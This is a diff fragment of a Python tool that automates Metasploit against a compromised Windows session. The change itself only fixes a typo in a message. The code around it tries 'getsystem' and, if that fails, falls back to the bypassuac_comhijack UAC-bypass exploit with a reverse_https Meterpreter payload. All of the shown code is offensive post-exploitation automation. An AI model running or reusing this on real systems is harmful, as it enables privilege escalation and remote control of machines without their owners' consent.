@@ -15,7 +15,7 @@ class Escalation:
                 esc = EscalationData()
                 getsystem = msfclient.client.sessions.session(sessionInput).run_with_output('getsystem').splitlines()
                 if '[-]' in getsystem[0]:
-                    print("[!]Failed getsystem. Trying bypass_comijack...")
+                    print("[!]Failed getsystem. Trying bypassuac_comijack...")
                     exploit = msfclient.client.modules.use('exploit', 'exploit/windows/local/bypassuac_comhijack')
                     exploit['SESSION'] = int(sessionInput)
                     payload = msfclient.client.modules.use('payload', 'windows/x64/meterpreter/reverse_https')
